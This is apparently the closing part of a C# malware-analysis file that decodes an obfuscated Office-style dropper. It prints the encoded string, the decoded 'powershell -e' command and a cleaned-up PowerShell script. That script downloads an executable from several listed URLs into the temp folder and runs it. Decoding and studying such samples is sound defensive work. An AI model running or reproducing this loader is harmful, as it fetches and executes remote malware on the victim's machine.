21u7gsgggC8AKg58[sn ]]][ jsa 21u7gsgggBoAHQ58[sn ]]][ jsa 21u7gsgggAJwAr58[sn ]]][ jsa 21u7gsgggACcAd58[sn ]]][ jsa 21u7gsgggAAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsgggwADoA58[sn ]]][ jsa 21u7gsgggLwAnA58[sn ]]][ jsa 21u7gsgggCsAJw58[sn ]]][ jsa 21u7gsgggAvAHc58[sn ]]][ jsa 21u7gsgggAdwB358[sn ]]][ jsa 21u7gsgggAC4AJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcAbAB58[sn ]]][ jsa 21u7gsggghAGkA58[sn ]]][ jsa 21u7gsgggYgByA58[sn ]]][ jsa 21u7gsgggCcAKw58[sn ]]][ jsa 21u7gsgggAnAGE58[sn ]]][ jsa 21u7gsgggAeQAu58[sn ]]][ jsa 21u7gsgggAGMAb58[sn ]]][ jsa 21u7gsgggwBtAC58[sn ]]][ jsa 21u7gsggg8AYgA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwBsA58[sn ]]][ jsa 21u7gsgggG8AJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAZwAv58[sn ]]][ jsa 21u7gsgggAE4AO58[sn ]]][ jsa 21u7gsgggQB6AC58[sn ]]][ jsa 21u7gsggg8AJwA58[sn ]]][ jsa 21u7gsgggpAC4A58[sn ]]][ jsa 21u7gsgggIgBTA58[sn ]]][ jsa 21u7gsgggGAAUA58[sn ]]][ jsa 21u7gsgggBMAGk58[sn ]]][ jsa 21u7gsgggAdAAi58[sn ]]][ jsa 21u7gsgggACgAW58[sn ]]][ jsa 21u7gsgggwBjAG58[sn ]]][ jsa 21u7gsggggAYQB58[sn ]]][ jsa 21u7gsgggyAF0A58[sn ]]][ jsa 21u7gsgggNAAyA58[sn ]]][ jsa 21u7gsgggCkAOw58[sn ]]][ jsa 21u7gsgggAkAEI58[sn ]]][ jsa 21u7gsgggAbwA358[sn ]]][ jsa 21u7gsgggAG8Ab58[sn ]]][ jsa 21u7gsgggwBxAG58[sn ]]][ jsa 21u7gsggg0APQA58[sn ]]][ jsa 21u7gsgggoACcA58[sn ]]][ jsa 21u7gsgggRwBmA58[sn ]]][ jsa 21u7gsgggGQAJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAcQBv58[sn ]]][ jsa 21u7gsgggADgAM58[sn ]]][ jsa 21u7gsgggQAnAC58[sn ]]][ jsa 21u7gsgggkAOwB58[sn ]]][ jsa 21u7gsgggmAG8A58[sn ]]][ jsa 21u7gsgggcgBlA58[sn ]]][ jsa 21u7gsgggGEAYw58[sn ]]][ jsa 21u7gsgggBoACg58[sn ]]][ jsa 21u7gsgggAJABZ58[sn ]]][ jsa 21u7gsgggAGIAe58[sn ]]][ jsa 21u7gsggggBtAG58[sn ]]][ jsa 21u7gsggg4AeAB58[sn ]]][ jsa 21u7gsgggqACAA58[sn ]]][ jsa 21u7gsgggaQBuA58[sn ]]][ jsa 21u7gsgggCAAJA58[sn ]]][ jsa 21u7gsgggBMAGQ58[sn ]]][ jsa 21u7gsgggAdwBl58[sn ]]][ jsa 21u7gsgggAGEAY58[sn ]]][ jsa 21u7gsgggQBnAC58[sn ]]][ jsa 21u7gsgggkAewB58[sn ]]][ jsa 21u7gsggg0AHIA58[sn ]]][ jsa 21u7gsgggeQB7A58[sn ]]][ jsa 21u7gsgggCQAQg58[sn ]]][ jsa 21u7gsgggB3AGE58[sn ]]][ jsa 21u7gsgggAMQBz58[sn ]]][ jsa 21u7gsgggADgAZ58[sn ]]][ jsa 21u7gsgggAAuAC58[sn ]]][ jsa 21u7gsgggIAZAB58[sn ]]][ jsa 21u7gsgggPAHcA58[sn ]]][ jsa 21u7gsgggbgBgA58[sn ]]][ jsa 21u7gsgggGwATw58[sn ]]][ jsa 21u7gsgggBBAEQ58[sn ]]][ jsa 21u7gsgggAYABG58[sn ]]][ jsa 21u7gsgggAEkAY58[sn ]]][ jsa 21u7gsgggABMAE58[sn ]]][ jsa 21u7gsgggUAIgA58[sn ]]][ jsa 21u7gsgggoACQA58[sn ]]][ jsa 21u7gsgggWQBiA58[sn ]]][ jsa 21u7gsgggHoAbQ58[sn ]]][ jsa 21u7gsgggBuAHg58[sn ]]][ jsa 21u7gsgggAagAs58[sn ]]][ jsa 21u7gsgggACAAJ58[sn ]]][ jsa 21u7gsgggABFAG58[sn ]]][ jsa 21u7gsggg8ANAB58[sn ]]][ jsa 21u7gsgggnADEA58[sn ]]][ jsa 21u7gsgggMAB6A58[sn ]]][ jsa 21u7gsgggCkAOw58[sn ]]][ jsa 21u7gsgggAkAFI58[sn ]]][ jsa 21u7gsgggAZAA158[sn ]]][ jsa 21u7gsgggAHcAO58[sn ]]][ jsa 21u7gsgggAB2AG58[sn ]]][ jsa 21u7gsggg8APQA58[sn ]]][ jsa 21u7gsgggoACcA58[sn ]]][ jsa 21u7gsgggUwBiA58[sn ]]][ jsa 21u7gsgggGEAbw58[sn ]]][ jsa 21u7gsgggBoACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggADAAZ58[sn ]]][ jsa 21u7gsgggAAnAC58[sn ]]][ jsa 21u7gsgggkAOwB58[sn ]]][ jsa 21u7gsgggJAGYA58[sn ]]][ jsa 21u7gsgggIAAoA58[sn ]]][ jsa 21u7gsgggCgAJg58[sn ]]][ jsa 21u7gsgggAoACc58[sn ]]][ jsa 21u7gsgggARwBl58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAH58[sn ]]][ jsa 21u7gsgggQALQB58[sn ]]][ jsa 21u7gsgggJACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggHQAZQ58[sn ]]][ jsa 21u7gsgggBtACc58[sn ]]][ jsa 21u7gsgggAKQAg58[sn ]]][ jsa 21u7gsgggACQAR58[sn ]]][ jsa 21u7gsgggQBvAD58[sn ]]][ jsa 21u7gsgggQAZwA58[sn ]]][ jsa 21u7gsgggxADAA58[sn ]]][ jsa 21u7gsgggegApA58[sn ]]][ jsa 21u7gsgggC4AIg58[sn ]]][ jsa 21u7gsgggBMAGA58[sn ]]][ jsa 21u7gsgggARQBu58[sn ]]][ jsa 21u7gsgggAGAAZ58[sn ]]][ jsa 21u7gsgggwBUAG58[sn ]]][ jsa 21u7gsggggAIgA58[sn ]]][ jsa 21u7gsggggAC0A58[sn ]]][ jsa 21u7gsgggZwBlA58[sn ]]][ jsa 21u7gsgggCAAMw58[sn ]]][ jsa 21u7gsgggA3ADg58[sn ]]][ jsa 21u7gsgggANAAx58[sn ]]][ jsa 21u7gsgggACkAI58[sn ]]][ jsa 21u7gsgggAB7AC58[sn ]]][ jsa 21u7gsgggYAKAA58[sn ]]][ jsa 21u7gsgggnAEkA58[sn ]]][ jsa 21u7gsgggbgB2A58[sn ]]][ jsa 21u7gsgggG8Aaw58[sn ]]][ jsa 21u7gsgggBlAC058[sn ]]][ jsa 21u7gsgggASQAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwB0AG58[sn ]]][ jsa 21u7gsgggUAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggbQAnA58[sn ]]][ jsa 21u7gsgggCkAKA58[sn ]]][ jsa 21u7gsgggAkAEU58[sn ]]][ jsa 21u7gsgggAbwA058[sn ]]][ jsa 21u7gsgggAGcAM58[sn ]]][ jsa 21u7gsgggQAwAH58[sn ]]][ jsa 21u7gsgggoAKQA58[sn ]]][ jsa 21u7gsggg7ACQA58[sn ]]][ jsa 21u7gsgggWQAzA58[sn ]]][ jsa 21u7gsgggG0AZA58[sn ]]][ jsa 21u7gsgggBsAGM58[sn ]]][ jsa 21u7gsgggANQA958[sn ]]][ jsa 21u7gsgggACgAJ58[sn ]]][ jsa 21u7gsgggwBKAH58[sn ]]][ jsa 21u7gsggggAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggMABjA58[sn ]]][ jsa 21u7gsgggG8ANg58[sn ]]][ jsa 21u7gsgggAxACc58[sn ]]][ jsa 21u7gsgggAKQA758[sn ]]][ jsa 21u7gsgggAGIAc58[sn ]]][ jsa 21u7gsggggBlAG58[sn ]]][ jsa 21u7gsgggEAawA58[sn ]]][ jsa 21u7gsggg7ACQA58[sn ]]][ jsa 21u7gsgggWgA5A58[sn ]]][ jsa 21u7gsgggHUAeg58[sn ]]][ jsa 21u7gsgggBpAG058[sn ]]][ jsa 21u7gsgggAcwA958[sn ]]][ jsa 21u7gsgggACgAJ58[sn ]]][ jsa 21u7gsgggwBSAC58[sn ]]][ jsa 21u7gsgggcAKwA58[sn ]]][ jsa 21u7gsgggnAHkA58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcAbg58[sn ]]][ jsa 21u7gsgggBxADA58[sn ]]][ jsa 21u7gsgggAcQBr58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggQB9AH58[sn ]]][ jsa 21u7gsggg0AYwB58[sn ]]][ jsa 21u7gsggghAHQA58[sn ]]][ jsa 21u7gsgggYwBoA58[sn ]]][ jsa 21u7gsgggHsAfQ58[sn ]]][ jsa 21u7gsgggB9ACQ58[sn ]]][ jsa 21u7gsgggARgB058[sn ]]][ jsa 21u7gsgggAHIAZ58[sn ]]][ jsa 21u7gsggggBuAG58[sn ]]][ jsa 21u7gsgggoAbwA58[sn ]]][ jsa 21u7gsggg9ACgA58[sn ]]][ jsa 21u7gsgggJwBBA58[sn ]]][ jsa 21u7gsgggHEAdA58[sn ]]][ jsa 21u7gsgggAnACs58[sn ]]][ jsa 21u7gsgggAJwA558[sn ]]][ jsa 21u7gsgggAHEAZ58[sn ]]][ jsa 21u7gsggggBsAC58[sn ]]][ jsa 21u7gsgggcAKQA58[sn ]]][ jsa 21u7gsggg=";
            return Func3(l_var1);
        }


        // New lines were inserted for easy-ish readability
        // Func4 returns the following string:
        /* 
        "powersheLL -e JABFAHQANwBrADAAegBkAD0AKAAnAEQAJwArACcANgA3AHMAaAAnACsAJwB2ADIAJwApADsAJgAoACcAbgBlAHcALQAnACsAJwBpAHQAJwArACcAZQBtACcAKQAgACQARQ
        BOAFYAOgBUAGUAbQBQAFwATwBGAGYAaQBDAEUAMgAwADEAOQAgAC0AaQB0AGUAbQB0AHkAcABlACAARABpAFIARQBjAFQAbwBSAFkAOwBbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQB
        uAHQATQBhAG4AYQBnAGUAcgBdADoAOgAiAFMARQBgAGMAdQBSAGkAVAB5AHAAcgBvAFQAYABPAGMAYABvAGwAIgAgAD0AIAAoACcAdABsAHMAMQAyACwAIAB0ACcAKwAnAGwAcwAxACcAKwAn
        ADEALAAgAHQAJwArACcAbABzACcAKQA7ACQAVgBuAGIAeQBhAGgAeAAgAD0AIAAoACcASQBuACcAKwAnAHUAZQBkADkAcQAnACkAOwAkAEsAdQBsAHgAXwB0AHYAPQAoACcASwAzACcAKwAnA
        GcANgAyACcAKwAnAF8AegAnACkAOwAkAEUAbwA0AGcAMQAwAHoAPQAkAGUAbgB2ADoAdABlAG0AcAArACgAKAAnAEIAcQBNACcAKwAnAE8AZgBmAGkAJwArACcAYwBlADIAMAAnACsAJwAxAD
        kAQgAnACsAJwBxAE0AJwApACAAIAAtAHIARQBQAGwAYQBDAGUAIAAoAFsAYwBIAGEAUgBdADYANgArAFsAYwBIAGEAUgBdADEAMQAzACsAWwBjAEgAYQBSAF0ANwA3ACkALABbAGMASABhAFI
        AXQA5ADIAKQArACQAVgBuAGIAeQBhAGgAeAArACgAJwAuAGUAJwArACcAeABlACcAKQA7ACQASABzAGEANwBkAGcANgA9ACgAJwBRAHcAbAB4ACcAKwAnAHgAdAA1ACcAKQA7ACQAQgB3AGEA
        MQBzADgAZAA9AC4AKAAnAG4AZQAnACsAJwB3AC0AbwBiAGoAZQBjACcAKwAnAHQAJwApACAATgBlAFQALgB3AEUAQgBjAGwASQBlAE4AdAA7ACQATABkAHcAZQBhAGEAZwA9ACgAJwBoACcAK
        wAnAHQAdABwACcAKwAnADoALwAvAHQAJwArACcAaAAnACsAJwBpAGMAJwArACcAaAAnACsAJwBkACcAKwAnAGkAcgAnACsAJwB1AG4AJwArACcAZwAnACsAJwAuACcAKwAnAGMAbwBtAC8AJw
        ArACcAZAB1AHAALQBpAG4AcwB0AGEAbABsACcAKwAnAGUAcgAvADYAcwAyACcAKwAnAHAATgBXACcAKwAnAEgALwAqAGgAdAB0AHAAOgAvAC8AcwAnACsAJwB1AG4AZwB2AGEAbABvAHAAawB
        oACcAKwAnAG8AJwArACcAbgBnACcAKwAnAHMAYQBtACcAKwAnAC4AJwArACcAYwBvAG0ALwAnACsAJwB0AGUAJwArACcAbQBwAC8AdAA5ACcAKwAnADAAJwArACcAeQBqACcAKwAnAHMALwAn
        ACsAJwAqACcAKwAnAGgAdAB0AHAAOgAnACsAJwAvACcAKwAnAC8AZAAnACsAJwByAHMAaABlAGsAaAAnACsAJwBhACcAKwAnAHIAYgBpAHMAJwArACcAdwBhACcAKwAnAHMAJwArACcALgBjA
        G8AbQAvAGMAZwAnACsAJwBpAC0AYgBpAG4AJwArACcALwBMAGEAJwArACcAMQAvACoAJwArACcAaAB0AHQAcABzACcAKwAnADoAJwArACcALwAvAHcAdwAnACsAJwB3AC4AcAByACcAKwAnAG
        8AJwArACcAeQBlAGMAdABvACcAKwAnAGIAJwArACcAYQAnACsAJwB5AGEAJwArACcAYwB1AC4AYwBvAG0ALwBuACcAKwAnAG8AdABoAGkAbgAnACsAJwBnAC8AJwArACcANQAvACoAaAB0ACc
        AKwAnAHQAcAA6AC8ALwAnACsAJwBkACcAKwAnAGkAJwArACcAZwAnACsAJwBpAHQAYQAnACsAJwBsAG0AYQByAGsAZQAnACsAJwB0AGkAJwArACcAbgBnAGIAbABvAGcAJwArACcAZwAnACsA
        JwBlAHIAcwAuACcAKwAnAGMAbwAnACsAJwBtAC8AZQAnACsAJwBsACcAKwAnAGoAdQAvACcAKwAnAEEAbwA1AEkASgB5AC8AKgAnACsAJwBoAHQAJwArACcAdAAnACsAJwBwADoALwAnACsAJ
        wAvAHIAZQBjAHUAcABlAHIAYQBhACcAKwAnAHQAdQBwAGEAcgBlAGoAJwArACcAYQAnACsAJwAuAGMAJwArACcAbwBtACcAKwAnAC8AJwArACcAQQByAGMAaABpAHYAbwBzACcAKwAnAHYAaQ
        BlAGoAbwBzACcAKwAnAC8AJwArACcAdAB3AC8AKgBoAHQAJwArACcAdAAnACsAJwBwADoALwAnACsAJwAvAHcAdwB3AC4AJwArACcAbABhAGkAYgByACcAKwAnAGEAeQAuAGMAbwBtAC8AYgA
        nACsAJwBsAG8AJwArACcAZwAvAE4AOQB6AC8AJwApAC4AIgBTAGAAUABMAGkAdAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAEIAbwA3AG8AbwBxAG0APQAoACcARwBmAGQAJwArACcAcQBv
        ADgAMQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJABZAGIAegBtAG4AeABqACAAaQBuACAAJABMAGQAdwBlAGEAYQBnACkAewB0AHIAeQB7ACQAQgB3AGEAMQBzADgAZAAuACIAZABPAHcAbgBgA
        GwATwBBAEQAYABGAEkAYABMAEUAIgAoACQAWQBiAHoAbQBuAHgAagAsACAAJABFAG8ANABnADEAMAB6ACkAOwAkAFIAZAA1AHcAOAB2AG8APQAoACcAUwBiAGEAbwBoACcAKwAnADAAZAAnAC
        kAOwBJAGYAIAAoACgAJgAoACcARwBlACcAKwAnAHQALQBJACcAKwAnAHQAZQBtACcAKQAgACQARQBvADQAZwAxADAAegApAC4AIgBMAGAARQBuAGAAZwBUAGgAIgAgAC0AZwBlACAAMwA3ADg
        ANAAxACkAIAB7ACYAKAAnAEkAbgB2AG8AawBlAC0ASQAnACsAJwB0AGUAJwArACcAbQAnACkAKAAkAEUAbwA0AGcAMQAwAHoAKQA7ACQAWQAzAG0AZABsAGMANQA9ACgAJwBKAHgAJwArACcA
        MABjAG8ANgAxACcAKQA7AGIAcgBlAGEAawA7ACQAWgA5AHUAegBpAG0AcwA9ACgAJwBSACcAKwAnAHkAJwArACcAbgBxADAAcQBrACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQARgB0AHIAZ
        gBuAGoAbwA9ACgAJwBBAHEAdAAnACsAJwA5AHEAZgBsACcAKQA="
         */



        // New lines were inserted for easy-ish readability
        // This is the decoded Base64 string from above:
        /*
          $Et7k0zd=('D'+'67sh'+'v2');&('new-'+'it'+'em') $ENV:TemP\OFfiCE2019 -itemtype DiREcToRY;[Net.ServicePointManager]::"SE`cuRiTyproT`Oc`ol" = ('tl
          s12, t'+'ls1'+'1, t'+'ls');$Vnbyahx = ('In'+'ued9q');$Kulx_tv=('K3'+'g62'+'_z');$Eo4g10z=$env:temp+(('BqM'+'Offi'+'ce20'+'19B'+'qM')  -rEPlaCe 
          ([cHaR]66+[cHaR]113+[cHaR]77),[cHaR]92)+$Vnbyahx+('.e'+'xe');$Hsa7dg6=('Qwlx'+'xt5');$Bwa1s8d=.('ne'+'w-objec'+'t') NeT.wEBclIeNt;$Ldweaag=('h'
          +'ttp'+'://t'+'h'+'ic'+'h'+'d'+'ir'+'un'+'g'+'.'+'com/'+'dup-install'+'er/6s2'+'pNW'+'H/*http://s'+'ungvalopkh'+'o'+'ng'+'sam'+'.'+'com/'+'te'+
          'mp/t9'+'0'+'yj'+'s/'+'*'+'http:'+'/'+'/d'+'rshekh'+'a'+'rbis'+'wa'+'s'+'.com/cg'+'i-bin'+'/La'+'1/*'+'https'+':'+'//ww'+'w.pr'+'o'+'yecto'+'b'
          +'a'+'ya'+'cu.com/n'+'othin'+'g/'+'5/*ht'+'tp://'+'d'+'i'+'g'+'ita'+'lmarke'+'ti'+'ngblog'+'g'+'ers.'+'co'+'m/e'+'l'+'ju/'+'Ao5IJy/*'+'ht'+'t'+
          'p:/'+'/recuperaa'+'tuparej'+'a'+'.c'+'om'+'/'+'Archivos'+'viejos'+'/'+'tw/*ht'+'t'+'p:/'+'/www.'+'laibr'+'ay.com/b'+'lo'+'g/N9z/')."S`PLit"(
          [char]42);$Bo7ooqm=('Gfd'+'qo81');foreach($Ybzmnxj in $Ldweaag){try{$Bwa1s8d."dOwn`lOAD`FI`LE"($Ybzmnxj, $Eo4g10z);$Rd5w8vo=('Sbaoh'+'0d');If (
          (&('Ge'+'t-I'+'tem') $Eo4g10z)."L`En`gTh" -ge 37841) {&('Invoke-I'+'te'+'m')($Eo4g10z);$Y3mdlc5=('Jx'+'0co61');break;$Z9uzims=('R'+'y'+'nq0qk')
          }}catch{}}$Ftrfnjo=('Aqt'+'9qfl')
         */

        // As you can see the powershell command is also obfuscated.
        // Here it is all split apart so it looks a little more clean

        /*
         $Et7k0zd=('D'+'67sh'+'v2');

        &('new-'+'it'+'em') $ENV:TemP\OFfiCE2019 -itemtype DiREcToRY;

        [Net.ServicePointManager]::"SE`cuRiTyproT`Oc`ol" = ('tls12, t'+'ls1'+'1, t'+'ls');

        $Vnbyahx = ('In'+'ued9q');
        $Kulx_tv=('K3'+'g62'+'_z');
        $Eo4g10z=$env:temp+(('BqM'+'Offi'+'ce20'+'19B'+'qM')  -rEPlaCe ([cHaR]66+[cHaR]113+[cHaR]77),[cHaR]92)+$Vnbyahx+('.e'+'xe');

        $Hsa7dg6=('Qwlx'+'xt5');
        $Bwa1s8d=.('ne'+'w-objec'+'t')NeT.wEBclIeNt;

        $Ldweaag=('h'+'ttp'+'://t'+'h'+'ic'+'h'+'d'+'ir'+'un'+'g'+'.'+'com/'+'dup-install'+'er/6s2'+'pNW'+'H/*http://s'+'ungvalopkh'+'o'+'ng'+'sam'+'.'+'com/'+'te'+'mp/t9'+'0'+'yj'+'s/'+'*'+'http:'+'/'+'/d'+'rshekh'+'a'+'rbis'+'wa'+'s'+'.com/cg'+'i-bin'+'/La'+'1/*'+'https'+':'+'//ww'+'w.pr'+'o'+'yecto'+'b'+'a'+'ya'+'cu.com/n'+'othin'+'g/'+'5/*ht'+'tp://'+'d'+'i'+'g'+'ita'+'lmarke'+'ti'+'ngblog'+'g'+'ers.'+'co'+'m/e'+'l'+'ju/'+'Ao5IJy/*'+'ht'+'t'+'p:/'+'/recuperaa'+'tuparej'+'a'+'.c'+'om'+'/'+'Archivos'+'viejos'+'/'+'tw/*ht'+'t'+'p:/'+'/www.'+'laibr'+'ay.com/b'+'lo'+'g/N9z/')."S`PLit"([char]42);

        $Bo7ooqm=('Gfd'+'qo81');

        foreach($Ybzmnxj in $Ldweaag)
        {
	        try
	        {
		        $Bwa1s8d."dOwn`lOAD`FI`LE"($Ybzmnxj, $Eo4g10z);
		        $Rd5w8vo=('Sbaoh'+'0d');
		
		        If ((&('Ge'+'t-I'+'tem') $Eo4g10z)."L`En`gTh" -ge 37841) 
		        {
			        &('Invoke-I'+'te'+'m')($Eo4g10z);
			        $Y3mdlc5=('Jx'+'0co61');
			        break;
			
			        $Z9uzims=('R'+'y'+'nq0qk')
		        }
	        }
	        catch
	        {
	        }
        }

        $Ftrfnjo=('Aqt'+'9qfl')
         */

    }
}
